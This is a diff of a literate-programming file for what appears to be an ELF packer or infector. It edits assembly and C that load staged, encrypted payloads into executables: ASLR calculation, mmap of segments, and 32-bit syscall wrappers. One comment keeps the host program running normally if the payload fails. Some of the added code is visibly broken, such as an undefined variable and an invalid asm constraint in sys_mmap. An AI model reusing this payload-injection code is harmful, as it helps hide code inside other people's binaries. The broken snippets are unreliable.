@@ -1515,11 +1515,11 @@ Add to a compress file syscall, pop rdx, ret -
 
   /*size_t offset_mod[2][5] = {{0x8, 0x1d, 0x5e, 0x7f, 0x9e},{0x8, 0x1d, 0x5e, 0x7f, 0x9e}}; */
     //                         x32                           x64
-    size_t offset_mod[2][5] = {{0x84, 0x96, 0xc, 0x2f, 0x47},{0x8, 0x1d, 0x5e, 0x7f, 0x9e}/* {0xb, 0x1f, 0x5c, 0x7d, 0x9c} */};
+    size_t offset_mod[2][5] = {{0x84, 0x96, 0xc, 0x2f, 0x47},{0x8, 0x1f, 0x60, 0x81, 0xa0}/* {0xb, 0x1f, 0x5c, 0x7d, 0x9c} */};
     
     uint32_t prefix_size = elf_get_struct_size_elf_header((char *)ehdr.elf32) + elf_get_elfh_phentsize(&ehdr) * (2 + elf_is_gnu_stack_phdr((void *)&ehdr, class, phnum));
     uint32_t size_decrypt_buffer = stage2_elf_compress_encrypt_header_size;// Need to get somehow.
-    t_type tmp_val[] = {(t_type){.b8= (-1 + (2 * !is_64)) * (elf_get_highest_loadable_vaddr_avalaible((void *)&ehdr, class, phnum) + prefix_size + 5 + !is_64 * 0x6c)},
+    t_type tmp_val[] = {(t_type){.b8= (elf_get_highest_loadable_vaddr_avalaible((void *)&ehdr, class, phnum) + prefix_size + 5 + !is_64 * 0x6c)},
   		      (t_type){.b8=stage1_fd_size + prefix_size + stage2_elf_compress_encrypt_header_size},// s1 size
   		      (t_type){.b8=stage2_elf_buffer_size},// stage2_elf_buffer_size?
   		      (t_type){.b8=size_decrypt_buffer},
@@ -1947,7 +1947,6 @@ Add to a compress file syscall, pop rdx, ret -
                       /* *offset = offset_start + (vaddr - vaddr_start); */
                       /* return 0;  // In BSS, no file offset */
                   /* } */
-  // TODO Need to addapt to asm.
   /* int write_dyn(void *ptr, size_t aslr) */
   /* { */
   /*   t_elf_h ehdr = (t_elf_h) {.elf32 = ptr}; */
@@ -2192,7 +2191,7 @@ we gonna save it in the phdr[0] of the
 Already do by OS.
 There’s field need to change in auxiliary vectors:
 CLOSED: [2025-09-14 Sun 12:20]
-#+begin_src c :tangle payload/all_in.c
+#+begin_src c :tangle payload/x64/all_in.c
   #include <elf.h>
   #include <sys/mman.h>
   #include <fcntl.h>
@@ -2543,7 +2542,9 @@ CLOSED: [2025-09-29 Mon 11:58]
     	call   $+5
   	pop rax
     	mov rsi, 0xfefffffffffff000	;
-      	lea r15, [rax + rsi]		; r15 aslr
+  	push rax
+  	pop r15
+      	sub r15, rsi		; r15 aslr
   .vaddr_stage1:
   	and rax, 0xfffffffffffff000
   	push rax			;[rsp] = (vaddr) s1
@@ -2825,7 +2826,7 @@ CLOSED: [2025-09-29 Mon 11:58]
   	pop rax
   	push r11
   	syscall
-  	cmp rax, 0
+  	cmp rax, 0		;TODO cmp -4095
   	pop r11			;;entrypoint interp
   	jb _exit
   	push 0x4		     ; size of stage3
@@ -2851,7 +2852,7 @@ CLOSED: [2025-09-29 Mon 11:58]
   	pop rax
   	push rdi		;[rsp]vaddr_s3 size_s2, vaddr s2
   	push r11		;[rsp]interp_vaddr, vaddr_s3, size, vaddr s2
-  	syscall
+  	syscall			;TODO Protect test rax, rax jnz _exit
   	pop r11			;interp_vaddr[rsp] vaddr_s3, size, vaddr s2
 
   	
@@ -2867,7 +2868,7 @@ CLOSED: [2025-09-29 Mon 11:58]
   	push 0x1		;write syscall
   	pop rax
   	push r11
-          syscall
+          syscall			; I shouldn't protect this in case payload fail still working as normally.
   	pop r11;entrypoint interp [rsp]vaddr, size s3 size_s2, vaddr s2
 
   	.jmp_entry_for_stage3:
@@ -3043,14 +3044,14 @@ CLOSED: [2025-09-29 Mon 11:58]
       
       ; fd != -1 case
       and    ebp, 0x1                 ; Test PF_X flag (bit 0)
-      mov    r10, 0x12                ; ecx = 0x12 (MAP_PRIVATE)
+      mov    r10d, 0x12                ; ecx = 0x12 (MAP_PRIVATE)
       shl    ebp, 0x2                 ; Shift PF_X flag left by 2 (becomes PROT_EXEC if set)
       or     ebp, eax                 ; Combine flags
       jmp    .setup_mmap_params        ; Jump to setup mmap parameters
 
   .fd_is_negative_one:
       ; fd == -1 case
-      mov    r10, 0x32                ; ecx = 0x32 (MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS)
+      mov    r10d, 0x32                ; ecx = 0x32 (MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS)
       mov    ebp, 0x3                 ; ebp = 0x3 (PROT_READ | PROT_WRITE)
 
   .setup_mmap_params:
@@ -3136,7 +3137,7 @@ CLOSED: [2025-09-29 Mon 11:58]
       xor    r9d, r9d                 ; Clear r9d offset
       mov    r8d, 0xffffffff          ; Set r8d to -1 fd
       mov    edx, ebp                 ; edx = original flags
-      mov    r10, 0x32                ; Set ecx to 0x32 FIXED, PRIVATE, ANONYMOUS
+      mov    r10d, 0x32                ; Set ecx to 0x32 FIXED, PRIVATE, ANONYMOUS
   	push 0x9
   	pop rax
   	syscall
@@ -3267,159 +3268,7 @@ CLOSED: [2025-09-29 Mon 11:58]
       pop    r14                   ; Restore r14
       pop    r15                   ; Restore r15
       ret                         ; Return
-  ;; load_elf_generic:
-  ;;     ; Save callee-saved registers
-  ;;     push   r15
-  ;;     mov    r10, rdx              ; r10 = target_vaddr
-  ;;     mov    r15d, ecx             ; r15d = fd
-  ;;     push   r14
-  ;;     mov    r14, rsi              ; r14 = aslr_offset
-  ;;     push   r13
-  ;;     push   r12
-  ;;     push   rbp
-  ;;     mov    rbp, rdi              ; rbp = ptr
-  ;;     push   rbx
-  ;;     sub    rsp, 0x28             ; Allocate stack space
-
-  ;;     ; Load ELF program header pointer and count
-  ;;     mov    r12, QWORD  [rdi+0x20]  ; r12 = e_phoff
-  ;;     movzx  esi, WORD  [rdi+0x38]   ; esi = e_phnum
-  ;;     lea    rcx, [rsp+0x18]       ; rcx = pointer to max_vaddr result
-  ;;     lea    rdx, [rsp+0x10]       ; rdx = pointer to min_vaddr result
-  ;;     add    r12, rdi              ; r12 = ptr + e_phoff (actual program header address)
-  ;;     mov    rdi, r12              ; rdi = program header address
-  ;;     call   calculate_elf_memory_range  ; Call helper function
-
-  ;;     ; Get results from stack
-  ;;     mov    r13, QWORD  [rsp+0x10]  ; r13 = min_vaddr
-  ;;     mov    rsi, QWORD  [rsp+0x18] ; rsi = max_vaddr
-  ;;     mov    ecx, 0x22             ; ecx = MAP_PRIVATE | MAP_ANONYMOUS
-
-  ;;     ; Calculate total size and check target_vaddr
-  ;;     sub    rsi, r13              ; rsi = max_vaddr - min_vaddr (total_size)
-  ;;     test   r10, r10              ; Test target_vaddr
-  ;;     je     .use_default_flags    ; If zero, use default flags
-
-  ;;     ret                         ; Return
-
-  ;; ; uint64_t load_elf_generic(void *ptr, uint64_t aslr_offset, uint64_t target_vaddr, int fd)
-  ;; ; rdi = ptr, rsi = aslr_offset, rdx = target_vaddr, ecx = fd
-  ;; load_elf_generic:
-  ;;     ; Save callee-saved registers
-  ;;     push   r15
-  ;;     mov    r15, rsi              ; r15 = aslr_offset
-  ;;     push   r14
-  ;;     push   r13
-  ;;     push   r12
-  ;;     mov    r12, rdi              ; r12 = ptr
-  ;;     push   rbp
-  ;;     mov    rbp, rdx              ; rbp = target_vaddr
-  ;;     push   rbx
-  ;;     sub    rsp, 0x28             ; Allocate stack space
-      
-  ;;     ; Load ELF program header information
-  ;;     mov    r13, QWORD  [rdi+0x20]  ; r13 = e_phoff
-  ;;     movzx  esi, WORD  [rdi+0x38]   ; esi = e_phnum
-  ;;     mov    DWORD  [rsp+0x8], ecx   ; Save fd on stack
-  ;;     lea    rdx, [rsp+0x10]       ; rdx = pointer to stack for min_vaddr result
-  ;;     lea    rcx, [rsp+0x18]       ; rcx = pointer to stack for max_vaddr result
-  ;;     add    r13, rdi              ; r13 = ptr + e_phoff (actual program header address)
-  ;;     mov    rdi, r13              ; rdi = program header address
-  ;;     call   calculate_elf_memory_range  ; Call helper function to get memory range
-      
-  ;;     ; Load results from stack
-  ;;     mov    r14, QWORD  [rsp+0x10]  ; r14 = min_vaddr
-  ;;     mov    rsi, QWORD  [rsp+0x18]  ; rsi = max_vaddr
-
-  ;; ; Calculate memory size and check target_vaddr
-  ;;     sub    rsi, r14              ; rsi = max_vaddr - min_vaddr (total size)
-  ;;     mov r10d, DWORD [rsp + 0x8]
-  ;;     cmp   r10d, -1              ; Test target_vaddr
-  ;;     mov    r10, 0x22             ; ecx = MAP_PRIVATE | MAP_FIXED
-  ;;     jne     .use_min_addr         ; If zero, use calculated min_vaddr
-  ;;     add    rbp, r15              ; rbp = target_vaddr + aslr_offset
-  ;;     mov    r10, 0x32             ; ecx = MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS
-      
-  ;; .use_min_addr:
-  ;;     ; Setup mmap parameters
-  ;;     xor    r9d, r9d              ; r9d = 0 (file offset)
-  ;;     mov    r8d, 0xffffffff        ; r8d = -1 (MAP_ANONYMOUS)
-  ;;     xor    edx, edx              ; edx = 0 (PROT_NONE initially)
-  ;;     mov    rdi, rbp              ; rdi = target address
-  ;; 	push 0x9		 ;mmap nbr
-  ;; 	pop rax
-  ;; 	syscall
-      
-  ;;     ; Initialize loop variables
-  ;;     xor    r9d, r9d              ; r9d = 0 (counter)
-  ;;     mov    rbx, rax              ; rbx = result of mmap
-  ;;     cmp    rax, 0xffffffffffffffff  ; Check for mmap error
-  ;;     jne    .process_segments     ; If no error, process segments
-      
-  ;;     ; Handle mmap error
-  ;;     mov    rax, 0xffffffffffffffff  ; Return error
-  ;;     jmp    .cleanup_and_return   ; Jump to cleanup
-
-  ;; .load_segment_loop:
-  ;;     ; Prepare arguments for load_elf_segment
-  ;;     mov    r8d, DWORD  [rsp+0x8]  ; r8d = fd
-  ;;     mov    rcx, r14              ; rcx = min_vaddr
-  ;;     mov    rdx, r13              ; rdx = current program header
-  ;;     mov    rsi, r12              ; rsi = ptr
-  ;;     mov    rdi, rbx              ; rdi = mapping address
-  ;;     mov    DWORD  [rsp+0xc], r9d  ; Save counter on stack
-  ;;     call   load_elf_segment      ; Call load_elf_segment
-      
-  ;;     ; Check for error
-  ;;     inc    eax                   ; Increment result
-  ;;     je     .mmap_error           ; If error, jump to error handler
-      
-  ;;     ; Move to next program header and increment counter
-  ;;     mov    r9d, DWORD  [rsp+0xc]  ; Load counter
-  ;;     add    r13, 0x38             ; Advance to next program header
-  ;;     inc    r9d                   ; Increment counter
-
-  ;; .process_segments:
-  ;;     ; Check if all segments are processed
-  ;;     movzx  eax, WORD  [r12+0x38]  ; eax = e_phnum
-  ;;     cmp    eax, r9d              ; Compare with counter
-  ;;     jg     .load_segment_loop    ; If more segments, continue loop
-      
-  ;;     ; Check if we need to apply ASLR
-  ;;     test   rbp, rbp              ; Test target_vaddr
-  ;;     je     .skip_aslr_apply      ; If zero, skip ASLR application
-  ;;     test   r15, r15              ; Test aslr_offset
-  ;;     je     .skip_aslr_apply      ; If zero, skip ASLR application
-      
-  ;;     ; Apply ASLR to dynamic sections
-  ;;     mov    rsi, r15              ; rsi = aslr_offset
-  ;;     mov    rdi, rbx              ; rdi = mapping address
-  ;;     call   write_dyn             ; Call write_dyn to adjust dynamic addresses
-
-  ;; .skip_aslr_apply:
-  ;;     ; Calculate return value
-  ;;     mov    rax, rbx              ; rax = mapping address
-  ;;     sub    rax, r14              ; rax = mapping_address - min_vaddr
-  ;;     add    rax, QWORD  [r12+0x18]  ; rax = adjusted + entry point
-
-  ;; .cleanup_and_return:
-  ;;     ; Restore stack and registers
-  ;;     add    rsp, 0x28             ; Deallocate stack space
-  ;; 	push rbx
-  ;; 	pop rdi
-  ;;     pop    rbx                   ; Restore rbx
-  ;;     pop    rbp                   ; Restore rbp
-  ;;     pop    r12                   ; Restore r12
-  ;;     pop    r13                   ; Restore r13
-  ;;     pop    r14                   ; Restore r14
-  ;;     pop    r15                   ; Restore r15
-  ;;     ret                         ; Return
-
-  ;; .mmap_error:
-  ;;     ; Handle mmap error
-  ;;     mov    rax, 0xffffffffffffffff  ; Return error
-  ;;     jmp    .cleanup_and_return   ; Jump to cleanup
-
+  	
   ; uint64_t write_dyn(void *ptr, uint64_t aslr_offset)
   ; rdi = ptr mmap, rsi = aslr_offset
   write_dyn:
@@ -3568,7 +3417,8 @@ CLOSED: [2025-09-29 Mon 11:58]
 #+end_src
 ** Road map
 *** x64
-**** TODO Update how to calculate aslr. #1
+**** DONE Update how to calculate aslr. #1
+CLOSED: [2025-10-20 Mon 07:15]
 **** TODO Recover asm s2
 *** x32
 **** DONE learn asm inline gcc
@@ -3609,7 +3459,7 @@ CLOSED: [2025-10-19 Sun 19:48]
   static inline long syscall_3(long number, long arg1, long arg2, long arg3) {
       long result;
       __asm__ volatile (
-          "int $0x80"
+          "int $0x80\n\t"
           : "=a" (result)
           : "a" (number), "b" (arg1), "c" (arg2), "d" (arg3)
           : "memory"
@@ -3617,35 +3467,22 @@ CLOSED: [2025-10-19 Sun 19:48]
       return result;
   }
 
-  static inline long syscall_4(long number, long arg1, long arg2, long arg3, long arg4) {
-      long result;
-      register long r10 asm("r10") = arg4;
-      __asm__ volatile (
-          "int $0x80"
-          : "=a" (result)
-          : "a" (number), "b" (arg1), "c" (arg2), "d" (arg3), "r" (r10)
-          : "memory"
-      );
-      return result;
-  }
 
-  static inline long syscall_5(long number, long arg1, long arg2, long arg3, long arg4, long arg5) {
-      long result;
-      register long r10 asm("r10") = arg4;
-      register long r8 asm("r8") = arg5;
-      __asm__ volatile (
-          "int $0x80"
-          : "=a" (result)
-          : "a" (number), "b" (arg1), "c" (arg2), "d" (arg3), "r" (r10), "r" (r8)
-          : "memory"
-      );
-      return result;
-  }
 
   // Funciones específicas para syscalls comunes
   static inline void *sys_mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset) {
       // En x86, mmap usa el syscall 91 (mmap2 sería 192)
-      long result = syscall_6(91, (long)addr, length, prot, flags, fd, offset >> 12);
+    long result;
+     __asm__ volatile (
+  	"pushl %%ebp\n\t"
+  	"movl %7, %%ebp\n\t"
+  	"int $0x80\n\t"
+  	"popl %%ebp\n\t"
+  	: "=a" (result)
+          : "a" (192), "b" (vaddr), "c" (length), "d" (prot), "S" (flags), "D" (fd), m(offset)
+          : "memory"
+
+  		     );
       return (void *)result;
   }
 
